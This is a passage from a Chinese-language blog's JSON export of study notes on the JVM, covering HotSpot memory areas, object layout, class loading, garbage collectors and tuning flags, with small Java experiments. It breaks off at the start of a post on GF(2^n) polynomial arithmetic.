mp文件很小</p>\n</li>\n</ul>\n</li>\n<li>堆<ul>\n<li>存放对象实例</li>\n<li>垃圾收集器管理的主要区域</li>\n<li>线程共享。虚拟机启动时创建</li>\n<li>可以划分出多个线程私有的分配缓冲区</li>\n<li>有OutOfMemoryError异常</li>\n<li>规范要求，可以处于物理上不连续的内存空间，只要逻辑上连续即可。可以是可扩展或固定大小</li>\n</ul>\n</li>\n<li>虚拟机栈<ul>\n<li>线程私有。生命周期与线程相同</li>\n<li>栈帧中有：局部变量表（方法运行期不会改变大小，存有基本数据类型、对象引用、returnAddress类型）、操作数栈、动态链接、方法出口等信息</li>\n<li>方法调用对应于一个栈帧在虚拟机栈的入栈到出栈过程</li>\n<li>有StackOverflowError异常、OutOfMemoryError异常（只有可以动态扩展虚拟机栈的虚拟机再有OOM异常）</li>\n</ul>\n</li>\n<li>本地方法栈<ul>\n<li>类似于虚拟机栈</li>\n<li>线程私有、生命周期与线程相同</li>\n<li>具体的虚拟机可以自由实现</li>\n<li>有StackOverflowError和OutOfMemoryError异常</li>\n<li>在HotSpot虚拟机中并不区分虚拟机栈和本地方法栈</li>\n</ul>\n</li>\n<li>程序计数器<ul>\n<li>线程私有、生命周期与线程相同</li>\n<li>没有任何OutOfMemoryError情况</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"HotSpot在Java堆中对象的创建、布局、访问\"><a href=\"#HotSpot在Java堆中对象的创建、布局、访问\" class=\"headerlink\" title=\"HotSpot在Java堆中对象的创建、布局、访问\"></a><strong>HotSpot</strong>在Java堆中对象的创建、布局、访问</h3><h5 id=\"创建\"><a href=\"#创建\" class=\"headerlink\" title=\"创建\"></a>创建</h5><blockquote>\n<p>以下仅限于普通对象，不包括数组和class对象</p>\n</blockquote>\n<ul>\n<li>当遇到new指令时<ul>\n<li>在常量池定位这个类的符号引用，并检查该类是否已被加载、解析和初始化过。如果没有要执行对应的加载过程</li>\n<li>为新生对象分配内存（指针碰撞、空闲列表、TLAB）（在类加载后对象所需的内存便可完全确定）</li>\n<li>把分配到的内存空间都初始为0值（如果是TLAB，可以提前到TLAB分配时进行）</li>\n<li>设置对象头（哪个类的实例、如何找到类的元数据信息、对象的hashCode、对象的GC分代年龄等。根据是否启用偏向锁，对象头会有不同的设置方式）</li>\n<li>截止以上，从虚拟机的角度看，新对象已经产生了</li>\n<li>一般来说（由字节码中是否跟随invokespecial指令所决定），执行new指令之后会接着执行<code>&lt;init&gt;</code> 方法， 把对象按照程序员的意愿进行初始化， 这样一个真正可用的对象才算完全产生出来</li>\n</ul>\n</li>\n</ul>\n<h5 id=\"布局\"><a href=\"#布局\" class=\"headerlink\" title=\"布局\"></a>布局</h5><ul>\n<li>对象在内存中的布局有：对象头、实例数据、对齐填充</li>\n<li>对象头<ul>\n<li>第一部分用于存储对象自身的运行时数据，如哈希码（HashCode）、GC分代年龄、锁状态标志、线程持有的锁、偏向线程ID、偏向时间戳等</li>\n<li>第二部分是类型指针，即指向类元数据的指针</li>\n<li>如果是数组，还要有一块用于记录长度</li>\n</ul>\n</li>\n<li>实例数据<ul>\n<li>程序代码中所定义的各种类型的字段内容（包括从父类继承和子类中定义的）</li>\n<li>存储顺序会受到虚拟机分配策略参数（FieldsAllocationStyle） 和字段在Java源码中定义顺序的影响</li>\n<li>默认的分配策略是<ul>\n<li>相同宽度字段被分配在一起<ul>\n<li><code>longs/doubles</code></li>\n<li><code>ints</code></li>\n<li><code>shorts/chars</code></li>\n<li><code>bytes/booleans</code></li>\n<li><code>oops</code>(ordinary object pointers)（有个问题，指针不是64bit吗？）</li>\n</ul>\n</li>\n<li>满足上面那个条件后，父类定义的出现在子类之前</li>\n<li>如果CompactFields参数值为true（默认为true），那么子类之中较窄的变量也可能会插入到父类变量的空隙之中</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>padding<ul>\n<li>由于HotSpot VM的自动内存管理系统要求对象起始地址必须是8字节的整数倍，所以可能需要padding</li>\n</ul>\n</li>\n</ul>\n<h5 id=\"定位和访问\"><a href=\"#定位和访问\" class=\"headerlink\" title=\"定位和访问\"></a>定位和访问</h5><ul>\n<li>HotSpot使用直接指针。另一种方式是句柄（不是HotSpot采用的）</li>\n<li>句柄<ul>\n<li>需要在java堆中有句柄池</li>\n<li>句柄中包含对象的实例数据和类型数据的各自具体地址</li>\n<li>在对象被移动时，无需更新reference数据</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"类加载的时机\"><a href=\"#类加载的时机\" class=\"headerlink\" title=\"类加载的时机\"></a>类加载的时机</h3><blockquote>\n<p>注意，这一部分JVM有明确规定，但不知道是否有一些是实现相关的。我试验时用的是HotSpot，openJDK 1.8，client模式下</p>\n</blockquote>\n<ul>\n<li><p>按照作者说法</p>\n<blockquote>\n<p>常量在编译阶段会存入调用类的常量池中，本质上并没有直接引用到定义常量的类，因此不会触发定义常量的类的初始化</p>\n</blockquote>\n<p>在实验中</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">InitTest</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        System.out.println(Holder.str3);</span><br><span class=\"line\">        <span class=\"comment\">// 如果是输出str，则不会输出`Init Holder`</span></span><br><span class=\"line\">        <span class=\"comment\">// 如果是输出str2和str3则会</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">static</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Holder</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"keyword\">final</span> <span class=\"keyword\">static</span> String str = <span class=\"string\">\"Hello\"</span>;</span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"keyword\">final</span> <span class=\"keyword\">static</span> String str2 = <span class=\"keyword\">new</span> String(<span class=\"string\">\"NewString\"</span>);</span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"keyword\">final</span> <span class=\"keyword\">static</span> String str3 = String.valueOf(<span class=\"string\">\"Str3\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">static</span> &#123;</span><br><span class=\"line\">            System.out.println(<span class=\"string\">\"Init Holder\"</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h3 id=\"HotSpot-VM的结构\"><a href=\"#HotSpot-VM的结构\" class=\"headerlink\" title=\"HotSpot VM的结构\"></a>HotSpot VM的结构</h3><ul>\n<li>GC（可插拔）</li>\n<li>JIT（可插拔）</li>\n<li>runtime</li>\n</ul>\n<h3 id=\"HotSpot-Runtime\"><a href=\"#HotSpot-Runtime\" class=\"headerlink\" title=\"HotSpot Runtime\"></a>HotSpot Runtime</h3><h5 id=\"职责\"><a href=\"#职责\" class=\"headerlink\" title=\"职责\"></a>职责</h5><ul>\n<li>parsing of command line arguments</li>\n<li>VM life cycle</li>\n<li>class loading,</li>\n<li>byte code interpreter</li>\n<li>exception handling</li>\n<li>synchronization</li>\n<li>thread management</li>\n<li>Java Native Interface</li>\n<li>VM fatal error handling</li>\n<li>C++ (non-Java) heap management.</li>\n</ul>\n<h3 id=\"GC\"><a href=\"#GC\" class=\"headerlink\" title=\"GC\"></a>GC</h3><ul>\n<li>程序计数器、虚拟机栈、本地方法栈3个区域需要的内存<strong>基本上</strong>在类结构确定时就已知（JIT优化会有所改变），并且生命周期与线程、方法的进入退出相同，所以内存回收是确定的</li>\n<li>java堆和方法区需要的内存则需要运行时才知道，分配回收都是动态的，所以需要GC</li>\n<li>吞吐量=运行用户代码时间/(运行用户代码时间+垃圾收集时间)</li>\n</ul>\n<h5 id=\"GC的3件事\"><a href=\"#GC的3件事\" class=\"headerlink\" title=\"GC的3件事\"></a>GC的3件事</h5><ul>\n<li>哪些内存需要回收？</li>\n<li>什么时候回收？</li>\n<li>如何回收？</li>\n</ul>\n<h5 id=\"可作为CG-Roots的对象\"><a href=\"#可作为CG-Roots的对象\" class=\"headerlink\" title=\"可作为CG Roots的对象\"></a>可作为CG Roots的对象</h5><ul>\n<li>虚拟机栈（栈帧中的本地变量表） 中引用的对象</li>\n<li>方法区中类静态属性引用的对象</li>\n<li>方法区中常量引用的对象</li>\n<li>本地方法栈中JNI（即一般说的Native方法） 引用的对象</li>\n</ul>\n<h5 id=\"强、软、弱、虚引用\"><a href=\"#强、软、弱、虚引用\" class=\"headerlink\" title=\"强、软、弱、虚引用\"></a>强、软、弱、虚引用</h5><ul>\n<li>强引用：只要还存在，GC永远不会回收被引用对象</li>\n<li>软引用：对于软引用关联着的对象，在系统将要发生内存溢出异常之前，将会把这些对象列进回收范围之中进行第二次回收。如果这次回收还没有足够的内存，才会抛出内存溢出异常</li>\n<li>弱引用：被弱引用关联的对象只能生存到下一次垃圾收集发生之前。当垃圾收集器工作时，无论当前内存是否足够，都会回收掉只被弱引用关联的对象</li>\n<li>虚引用：也称为幽灵引用或者幻影引用，它是最弱的一种引用关系。一个对象是否有虚引用的存在，完全不会对其生存时间构成影响，也无法通过虚引用来取得一个对象实例。为一个对象设置虚引用关联的唯一目的就是能在这个对象被收集器回收时收到一个系统通知</li>\n</ul>\n<h5 id=\"Hotspot-GC\"><a href=\"#Hotspot-GC\" class=\"headerlink\" title=\"Hotspot GC\"></a>Hotspot GC</h5><ul>\n<li><p>Minor GC：新生代的GC，Eden空间的存活对象和from survivor空间的不够老的存活对象复制到to survivor空间，from survivor空间中足够老的对象提升为老年代。结束后，Eden空间一般是全空的（也有不空的情况）。只要追求速度，空间利用率会低一些</p>\n</li>\n<li><p>Major GC（Full GC）：老年代GC, Major GC经常会伴随至少一次的Minor GC（但非绝对的， 在Parallel Scavenge收集器的收集策略里就有直接进行Major GC的策略选择过程） 。 Major GC的速度一般会比Minor GC慢10倍以上</p>\n<blockquote>\n<p><em>java performance</em> HotSpot中译本P57注释有</p>\n<p>“实际上，HotSpot VM的FullGC收集整个堆，包括新生代、老年代、永生代”</p>\n</blockquote>\n</li>\n<li><p>过早提升：Minor GC时，to survivor空间不足，所以多余对象移到老年代</p>\n</li>\n<li><p>提升失败：Minor GC过程中，老年代满了，所以需要Full GC（这需要遍历整个java堆）</p>\n</li>\n<li><p>大对象可能直接分配到老年代</p>\n</li>\n</ul>\n<h6 id=\"各种GC\"><a href=\"#各种GC\" class=\"headerlink\" title=\"各种GC\"></a>各种GC</h6><ul>\n<li><p>Serial</p>\n<ul>\n<li>单线程Stop-The-World式收集器</li>\n<li>新生代使用复制收集算法（如同上面MinorGC那里描述的那样）</li>\n<li>可以与CMS配合</li>\n<li>应用场景<ul>\n<li>如果一台机器上有多个JVM（可能比CPU核数还多），那么使用Serial就很好。</li>\n<li>client模式下新生代的默认收集器（jdk7时？）</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p>Serial Old</p>\n<ul>\n<li><p>单线程Stop-The-World式收集器</p>\n</li>\n<li><p>Serial的老年代版本</p>\n</li>\n<li><p>使用标记清除压缩收集算法，回收时找出所有的存活对象，然后滑动到堆的头部</p>\n</li>\n<li><p>应用场景</p>\n<ul>\n<li><p>如果一台机器上有多个JVM（可能比CPU核数还多），那么使用Serial Old就很好。</p>\n</li>\n<li><p>主要给Client模式下的虚拟机用</p>\n</li>\n<li><p>在Server模式下,那么它主要还有两大用途</p>\n<ul>\n<li><p>一种用途是在JDK 1.5以及之前的版本中与Parallel Scavenge收集器搭配使用</p>\n<blockquote>\n<p>Parallel Scavenge收集器架构中本身有PS MarkSweep收集器来进行老年代收集,并非直接使用了Serial Old收集器,但是这个PS MarkSweep收集器与Serial Old的实现非常接近,所以在官方的许多资料中都是直接以Serial Old代替PS MarkSweep进行讲解</p>\n</blockquote>\n</li>\n<li><p>另一种用途就是作为CMS收集器的后备预案,在并发收集发生Concurrent Mode Failure时使用</p>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p>ParNew:</p>\n<ul>\n<li>Serial的多线程版本（除了多线程，与Serial差别没有差别）</li>\n<li>新生代的收集器</li>\n<li>可以与CMS配合</li>\n<li>应用场景<ul>\n<li>运行于Server模式下的首选新生代收集器（jdk7时？），因为除了serial，只有它能与CMS配合</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p>Parallel Scavenge</p>\n<ul>\n<li>又叫吞吐量优先处理器</li>\n<li>新生代的收集器</li>\n<li>多线程Stop-The-World式收集器，采用复制收集算法</li>\n<li>Parallel Scavenge收集器的目标则是达到一个可控制的吞吐量</li>\n<li>不能与CMS配合</li>\n<li>自适应调节策略也是Parallel Scavenge收集器与ParNew收集器的一个重要区别</li>\n<li>Parallel Scavenge收集器没有使用传统的GC收集器代码框架,而另外独立实现,其余几种收集器则共用了部分的框架代码</li>\n<li><code>-XX:MaxGCPauseMillis</code>：参数设置最大垃圾收收集停顿时间。GC停顿时间缩短是以牺牲吞吐量和新生代空间来换取的，设得过小可能导致频繁GC</li>\n<li><code>-XX:GCTimeRatio</code>：设置吞吐量，为大于0小于100的整数，设为$x$的含义是GC时间占$\\frac{1}{x+1}$，默认是99</li>\n<li><code>-XX:+UseAdaptiveSizePolicy</code>：打开后，就不需要手工指定新生代的大小(-Xmn)、Eden与Survivor区的比例、晋升老年代对象年龄等细节参数了</li>\n</ul>\n</li>\n<li><p>Parallel Old</p>\n<ul>\n<li>Parallel Scavenge收集器的老年代版本</li>\n<li>使用多线程和“标记-整理”算法</li>\n<li>这个收集器是在JDK 1.6中才开始提供的，以前只能让Parallel Scavenge与Serial Old配合</li>\n<li>在注重吞吐量以及CPU资源敏感的场合,都可以优先考虑Parallel Scavenge加Parallel Old收集器</li>\n</ul>\n</li>\n<li><p>CMS(Concurrent Mark Sweep)</p>\n<ul>\n<li><p>老年代的收集器</p>\n</li>\n<li><p>以获取最短回收停顿时间为目标的收集器</p>\n</li>\n<li><p>使用多线程、标记-清除算法</p>\n</li>\n<li><p>它第一次实现了让垃圾收集线程与用户线程(基本上)同时工作</p>\n</li>\n<li><p>尽可能并发、低停顿式的收集器，独立于HotSpot分代式GC框架另行实现的并行收集器</p>\n</li>\n<li><p>整个过程分为四个步骤：初始标记、并发标记、重新标记、并发清除</p>\n<blockquote>\n<p>初始标记、重新标记这两个步骤仍然需要“Stop The World”。初始标记仅仅只是标记一下GC Roots能直接关联到的对象,速度很快,并发标记阶段就是进行GC RootsTracing的过程,而重新标记阶段则是为了修正并发标记期间因用户程序继续运作而导致标记产生变动的那一部分对象的标记记录,这个阶段的停顿时间一般会比初始标记阶段稍长一些,但远比并发标记的时间短。由于整个过程中耗时最长的并发标记和并发清除过程收集器线程都可以与用户线程一起工作</p>\n</blockquote>\n</li>\n<li><p>缺点</p>\n<ul>\n<li><p>对CPU资源敏感（默认启动的回收线程是$(\\text{CPU数量}+3)/4$）</p>\n</li>\n<li><p>由于在垃圾收集阶段用户线程还需要运行，所以无法处理浮动垃圾，可能出现<code>Concurrent Mode Failure</code>失败而导致另一次FullGC</p>\n<blockquote>\n<p>要是CMS运行期间预留的内存无法满足程序需要,就会出现一次<code>Concurrent Mode Failure</code>失败,这时虚拟机将启动后备预案:临时启用Serial Old收集器来重新进行老年代的垃圾收集,这样停顿时间就很长了</p>\n</blockquote>\n</li>\n<li><p>由于在垃圾收集阶段用户线程还需要运行,那也就还需要预留有足够的内存空间给用户线程使用,因此CMS收集器不能像其他收集器那样等到老年代几乎完全被填满了再进行收集,需要预留一部分空间提供并发收集时的程序运作使用（可以通过<code>XX:CMSInitiatingOccupancyFraction</code>调高触发百分比，不过如果过高，就会出现<code>Concurrent Mode Failure</code>）</p>\n</li>\n<li><p>基于标记-清除算法，所以会有大量空间碎片，导致可能提前触发FullGC</p>\n<blockquote>\n<ul>\n<li>为了解决这个问题,CMS收集器提供了一个<code>XX:+UseCMSCompactAtFullCollection</code>开关参数(默认就是开启的),用于在CMS收集器顶不住要进行FullGC时开启内存碎片的合并整理过程,内存整理的过程是无法并发的,空间碎片问题没有了,但停顿时间不得不变长</li>\n<li>虚拟机设计者还提供了另外一个参数<code>-XX:CMSFullGCsBeforeCompaction</code>,这个参数是用于设置执行多少次不压缩的Full GC后,跟着来一次带压缩的(默认值为0,表示每次进入Full GC时都进行碎片整理)。</li>\n</ul>\n</blockquote>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p>G1</p>\n<ul>\n<li>G1收集器没有使用传统的GC收集器代码框架,而另外独立实现,其余几种收集器则共用了部分的框架代码</li>\n<li>面向服务端</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"类加载\"><a href=\"#类加载\" class=\"headerlink\" title=\"类加载\"></a>类加载</h3><blockquote>\n<p>在实际情况中， 每个Class文件都有可能代表着Java语言中的一个类或接口， 后文中直接对“类”的描述都包括了类和接口的可能性</p>\n</blockquote>\n<h5 id=\"链接\"><a href=\"#链接\" class=\"headerlink\" title=\"链接\"></a>链接</h5><ul>\n<li>在Java语言里面，类型的加载、 连接和初始化过程都是在程序运行期间完成的， 这种策略虽然会令类加载时稍微增加一些性能开销， 但是会为Java应用程序提供高度的灵活性，例如在运行时才指定某个接口的实现类</li>\n<li>验证、准备、解析三个部分统称为连接</li>\n</ul>\n<h5 id=\"生命周期\"><a href=\"#生命周期\" class=\"headerlink\" title=\"生命周期\"></a>生命周期</h5><ul>\n<li>加载（loading）</li>\n<li>验证</li>\n<li>准备</li>\n<li>解析</li>\n<li>初始化</li>\n<li>使用</li>\n<li>卸载</li>\n</ul>\n<h5 id=\"ClassLoader例子\"><a href=\"#ClassLoader例子\" class=\"headerlink\" title=\"ClassLoader例子\"></a>ClassLoader例子</h5><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">final</span> ClassLoader myLoader = <span class=\"keyword\">new</span> ClassLoader() &#123;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> Class&lt;?&gt; loadClass(String name) <span class=\"keyword\">throws</span> ClassNotFoundException &#123;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            String fileName = name.substring(name.lastIndexOf(<span class=\"string\">\".\"</span>) + <span class=\"number\">1</span>) + <span class=\"string\">\".class\"</span>;</span><br><span class=\"line\">            InputStream is = getClass().getResourceAsStream(fileName);</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (is == <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">                System.out.println(<span class=\"string\">\"use super loader\"</span>);</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"keyword\">super</span>.loadClass(name);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">byte</span>[] b = <span class=\"keyword\">new</span> <span class=\"keyword\">byte</span>[is.available()];</span><br><span class=\"line\">            is.read(b);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> defineClass(name, b, <span class=\"number\">0</span>, b.length);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (IOException e) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> ClassNotFoundException(name);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<h3 id=\"参数\"><a href=\"#参数\" class=\"headerlink\" title=\"参数\"></a>参数</h3><blockquote>\n<p>以下可能有HotSpot专有的参数</p>\n</blockquote>\n<ul>\n<li><p><code>-Xms</code>： the initial memory sizes available to the JVM</p>\n</li>\n<li><p><code>-Xmx</code>： the maximum memory sizes available to the JVM</p>\n</li>\n<li><p><code>-Xms</code>, <code>-Xmx</code>：用于JVM heap。Increasing the amount of memory available can improve performance, but increasing it to too high a value can have a detrimental effect in the form of longer pauses for full garbage collection runs. Therefore, the initial and maximum sizes should be set to the same value.</p>\n</li>\n<li><p><code>-Xmn</code>：新生代大小</p>\n</li>\n<li><p><code>-XX:SurvivorRatio</code>：Eden与Survivor区的比例</p>\n</li>\n<li><p><code>-XX:PretenureSizeThreshold</code>：晋升老年代对象的年龄</p>\n</li>\n<li><p><code>-Xss</code>：栈容量</p>\n</li>\n<li><p><code>-Xoss</code>：本地方法栈大小（因为HotSpot不区分虚拟机栈和本地方法栈，所以该参数无效）</p>\n</li>\n<li><p><code>-XX:MaxDirectMemorySize</code>：本地直接内存的最大容量。默认与java堆最大值一样</p>\n</li>\n<li><p><code>-Xnoclassgc</code>：是否对类进行回收（HotSpot VM）</p>\n</li>\n<li><p><code>-verbose:class</code>, <code>-XX:+TraceClassLoading</code>, <code>-XX:+TraceClassUnLoading</code>：查看类加载卸载信息。第三个需要FastDebug版虚拟机支持</p>\n</li>\n<li><p><code>-XX:+/-UseTLAB</code>：是否启用本地线程分配缓存</p>\n</li>\n<li><p><code>Xlog:gc*</code>, <code>-XX:+PrintGCDetails</code>：打印GC日志</p>\n</li>\n<li><p><code>-XX:MaxTenuringThreshold</code>：晋升老年代的年龄阀值</p>\n</li>\n<li><p><code>-XX:+PrintReferenceGC</code>：GC时打印finalReference的信息</p>\n</li>\n<li><p><code>-XX:+PrintGCApplicationStoppedTime</code>：打印到达安全点的信息</p>\n</li>\n<li><p><code>-XX:UseCompressedOops</code>：开启压缩指针</p>\n</li>\n<li><p><code>-XX:PretenureSizeThreshold</code>：大于这个设置值的对象直接在老年代分配。这样做的目的是避免在Eden区及两个Survivor区之间发生大量的内存复制（因为新生代采用复制算法收集内存）</p>\n<blockquote>\n<p>PretenureSizeThreshold参数只对Serial和ParNew两款收集器有效， Parallel Scavenge收集器不认识这个参数， Parallel Scavenge收集器一般并不需要设置。 如果遇到必须使用此参数的场合，可以考虑ParNew加CMS的收集器组合。</p>\n</blockquote>\n</li>\n</ul>\n<h3 id=\"实验和调优\"><a href=\"#实验和调优\" class=\"headerlink\" title=\"实验和调优\"></a>实验和调优</h3><h5 id=\"本地方法栈\"><a href=\"#本地方法栈\" class=\"headerlink\" title=\"本地方法栈\"></a>本地方法栈</h5><ul>\n<li>HotSpot，单线程下怎样测试都只抛出<code>StackOverflowError</code>，所以<code>StackOverflowError</code>应该不是因为调用深度超过某个值就抛出，而是内存不足导致抛出（所以相应减小栈上变量的总大小，可以提高栈深度）</li>\n<li>如果是建立过多线程导致的内存溢出，在不能减少线程数或者更换64位虚拟机的情况下， 就只能通过减少最大堆和减少栈容量来换取更多的线程</li>\n</ul>\n<h5 id=\"GC-1\"><a href=\"#GC-1\" class=\"headerlink\" title=\"GC\"></a>GC</h5><ul>\n<li>大对象对GC不友好，经常出现大对象容易导致内存还有不少空间时就提前触发垃圾收集以获取足够的连续空间来“安置”它们。写程序时应当避免“短命大对象”。</li>\n</ul>\n<h5 id=\"局部变量表的slot复用与GC\"><a href=\"#局部变量表的slot复用与GC\" class=\"headerlink\" title=\"局部变量表的slot复用与GC\"></a>局部变量表的slot复用与GC</h5><ul>\n<li><p>代码1</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Test</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">byte</span>[] placeHolder = <span class=\"keyword\">new</span> <span class=\"keyword\">byte</span>[<span class=\"number\">1024</span> * <span class=\"number\">1024</span> * <span class=\"number\">64</span>];</span><br><span class=\"line\">        System.gc();</span><br><span class=\"line\">        <span class=\"comment\">// gc后，placeHolder没有被gc掉</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>代码2</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Test2</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"keyword\">byte</span>[] placeHolder = <span class=\"keyword\">new</span> <span class=\"keyword\">byte</span>[<span class=\"number\">1024</span> * <span class=\"number\">1024</span> * <span class=\"number\">64</span>];</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        System.gc();</span><br><span class=\"line\">        <span class=\"comment\">// gc后，placeHolder没有被gc掉</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>代码3</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Test3</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"keyword\">byte</span>[] placeHolder = <span class=\"keyword\">new</span> <span class=\"keyword\">byte</span>[<span class=\"number\">1024</span> * <span class=\"number\">1024</span> * <span class=\"number\">64</span>];</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">int</span> a = <span class=\"number\">0</span>;</span><br><span class=\"line\">        System.gc();</span><br><span class=\"line\">        <span class=\"comment\">// gc后，placeHolder被gc掉</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><blockquote>\n<p>如果遇到一个方法，其后面的代码有一些耗时很长的操作，而前面又定义了占用了大量内存、实际上已经不会再使用的变量，手动将其设置为null值（用来代替那句<code>int a=0</code>，把变量对应的局部变量表Slot清空）便不见得是一个绝对无意义的操作，这种操作可以作为一种在极特殊情形（对象占用内存大、此方法的栈帧长时间不能被回收、方法调用次数达不到JIT的编译条件）下的“奇技”来使用。</p>\n</blockquote>\n</li>\n<li><blockquote>\n<p>从编码角度讲， 以恰当的变量作用域来控制变量回收时间才是最优雅的解决方法， 如代码清单8-3那样的场景并不多见。 更关键的是， 从执行角度讲， 使用赋null值的操作来优化内存回收是建立在对字节码执行引擎概念模型的理解之上的，但是实际执行中，与概念模型差别很大，所以赋null可能无必要（然而我自己使用java11，上面那个测试代码，G1，似乎没有<code>int a=0</code>就没有回收）</p>\n</blockquote>\n</li>\n</ul>\n","slug":"JVM-Note","categories":[{"name":"JAVA","slug":"JAVA","permalink":"https://h-zex.github.io/categories/JAVA/"},{"name":"JVM","slug":"JAVA/JVM","permalink":"https://h-zex.github.io/categories/JAVA/JVM/"}],"tags":[]},{"title":"$GF(2^n)$上算术运算的实现","date":"2018-10-18T12:06:10.000Z","path":"2018/10/18/GF-2-n上算术运算的实现/","text":"代码 几个关键点 求模时，算法如下 123456789101112131415def __modAndDiv__(x, y): \"\"\" return the (x%y, x/y) \"\"\" if y == 0: raise ZeroDivisionError xl = util.bitLen(x) yl = util.bitLen(y) if xl &lt; yl: return x, 0 d = 0 while xl &gt;= yl: x, d = Polynomial.__sub__(x, y &lt;&lt; (xl - yl)), Polynomial.__add__(d, (1 &lt;&lt; (xl - yl))) xl = util.bitLen(x) return x, d 要注意，不可以直接__sub__(x, y)，要__sub__(x, 